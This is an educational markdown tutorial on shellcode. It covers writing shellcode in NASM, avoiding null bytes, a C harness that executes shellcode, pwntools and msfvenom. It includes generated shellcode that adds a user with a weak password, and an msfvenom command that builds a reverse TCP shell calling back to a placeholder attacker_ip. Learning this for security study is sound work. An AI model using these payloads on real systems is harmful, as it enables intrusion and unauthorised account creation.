# Shellcode

A shellcode is a machine **dependent** code that can
be executed by the **CPU** directly w/o the need of Function **Parameters**
any **compiling**, **assembling** or **linking**. The typical goal of a **shellcode** is to create a **shell** preferably with **root** privileges, that is why it is named as shellcode. The **shellcode** is stored in a process
**address** **space** at some convenient place, which can be

- Code Section
- Process Stack
  - As part of input buffer
  - In some environment variable
- Process Heap
  
To execute a shellcode, all you need to do is
simply **transfer** control of execution to that **address**.

![Shellcode](../img/secmec.png)

### Shellcode Archives on Internet

---

A **good** **hacker** always write his/her own shellcodes, and the task is not
much tricky for **assembly** guys. The obvious drawback is that you can
write shellcode for the **architecture** that you are working on. What if you want
the shellcode for other architectures like **arm64**, **powerpc** or **android**.
Moreover, sometimes it becomes a bit tricky if you are not good at assembly
language programming. So being newbies the simplest option is
**downloading** shellcode for your specific **hardware** and **operating** **system** from some Internet archives like

- [Shellcodes database for study cases](https://shell-storm.org/shellcode/index.html)
- [Exploit Database](https://www.exploit-db.com/)

### Writing your own Shellcodes

---

- Can be written in C, but better to write in **assembly**.
- Must know the underlying system calls (execve(), open(), read(),
write(), dup2(), setresuid() and others). For example, place the
string **/bin/bash** in memory and pass it as argument to **syscall**()
system call
- Must have a clear **understanding** of **architecture**'s function **calling** **conventions**.
  
#### Steps to follow

- Write assembly code and create object file using following **command**

```bash
nasm -f elf64 <filename>.nasm
```

- Check out the **opcodes** in the **object** file

``````bash
objdump -M intel -D <filename>.o
``````

- If opcode of an instruction contain **NULL bytes** **'\x00'**, then that
assembly instruction must be **rewritten**(avoid them). For example

``````bash
MOV rax, 0         (b8 00 00 00 00)
XOR rax, rax       (48 31 c0)
``````

- Finally **extract** the **opcode** from the object file, which is you **shellcode**.

Once you have written your shellcode. You can use it. Mostly this shellcode is
made a part of the string which is given as input to a vulnerable program for a
buffer overflow attack. But today we will run our shellcodes as a stand alone C program.

- The general format of a C program using a shellcode is shown below

```C
#include <stdio.h>
#include <string.h>
char *code = "some kind of shellcode";
int main()
{
    printf("len:%d bytes\n", strlen(code));
    int (*foo)() = (int(*)())code;
    foo();
    return 0;
}
```

### NULL bytes

---

Null bytes (also known as null **terminators** or zero bytes) are binary values with all bits set to zero (ASCII value 0). In the context of shellcode and exploit development, the presence of null bytes in the shellcode can lead to **unintended** **behavior** and can pose **challenges** for **successful** exploitation.

- Many programming languages and libraries interpret null bytes as string **terminators**.
- If a null byte appears in the middle of the shellcode, it may prematurely **terminate** the shellcode or any surrounding data, causing the payload to be **incomplete** or **incorrect**.
- Null bytes can interfere with C string functions like **strcpy, strcat, and strlen**, which expect null-terminated strings.
- If shellcode contains null bytes, these functions might not work as expected, leading to **unexpected** behavior or crashes.
- Null bytes can lead to memory **corruption** if they are **misinterpreted** by the program. - For example, a null byte might terminate a buffer earlier than expected, causing buffer overflows or unexpected data **manipulation**.

## Example

---

Check out the [exitcode01.nasm](exitcode01.nasm)

- Compilation and extracting opcode (shellcode)
  
```bash
nasm -felf64 exitcode.nasm
ld exitcode.o
objdump -M -d intel ./a.out
objdump -M intel exitcode02.o -d | grep "^ " | cut -f2 
```

- Now run exitcode.c where shellcode is injected.

### Generating Shellcodes using PWN Tools

---

**Pwntools** which is a CTF(Capture the flag) framework and **exploit**
development library written in **python**. It is designed for rapid **prototyping** and
**development** and intended to make **exploit** writing as **simple** as **possible**.

```bash
sudo apt-get install python3-dev python3-pip
sudo pip install pwntools
```

We will focus on one of its sub-module called **shellcraft**, which allows
us to write **assembly** code similar to what we can do with [**NASM**](https://github.com/meharehsaan/intelx86-64), but using
python. So you don't have to know much about **assembly** to make it work.

### MSF and msfvenom

---

```bash
msfvenom -h
msfvenom -l payloads
msfvenom -l payloads | grep linux/x86
msfvenom -p linux/x86/adduser --payload-options
```

- **Metasploit** Framework is an open source **pentesting** framework used for
  - Vulnerability research
  - Writing, testing and using exploit code
  - Shellcode development
- This comes pre-installed with **Kali** Linux. There are many interfaces to it like,
**msfconsole, msfcli, msfgui, msfweb, and armitage**.
- Submodule **msfvenom**, to generate **predefined** shellcodes suitable for many
platforms and **architectures**. Some self contained **payloads** that do a specific task are
available in **/usr/share/metasploit-framework/modules/singles/** directory.
- msfvenom is a **combination** of **Msfpayload** and **Msfencode**, putting both of these
tools into a single Framework instance.
- Additional benefits of using **msfvenom** are like avoiding bad characters like **null**
bytes and generating the shellcode in various file formats to be used in C, Python,
or C# programs.
- **Meterpreter**, which is a post
**exploitation** tool and is used for in-memory dll/so-injection in the **memory** **space** of
the exploited process without having to **create** a new process.

#### Working

- The command below **creates** shell code for creating a user having **username** **mehar** and **password** 123 and the -**b** option avoids the **null** bytes and -**e** uses encoder for shellcode and -**f** **c** means can inject shellcode in c program.

```bash
msfvenom -p linux/x86/adduser PASS=123 USER=mehar -f c -b '\00' -e shikata_ga_nai

// shellcode generated by msfvenom for adding a user
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9"
"\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
"\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x23\x00\x00"
"\x00\x6d\x65\x68\x61\x72\x3a\x41\x7a\x4f\x4d\x52\x51\x4d"
"\x38\x47\x46\x39\x74\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04"
"\x58\xcd\x80\x6a\x01\x58\xcd\x80";
```

- Creates a shellcode for reverse tcp shell on some other machne to hack the machine by creating a shell on the victim machine.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=attacker_port -f elf -o shell.elf
```

## Links

- [Shell Code For Beginners](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf)
- [Shell Coding](https://www.arridae.com/blogs/shell-coding.php)
- [The Shellcoder's Handbook](https://ia800205.us.archive.org/8/items/Wiley.The.Shellcoders.Handbook.2nd.Edition.Aug.2007/Wiley.The.Shellcoders.Handbook.2nd.Edition.Aug.2007.pdf)
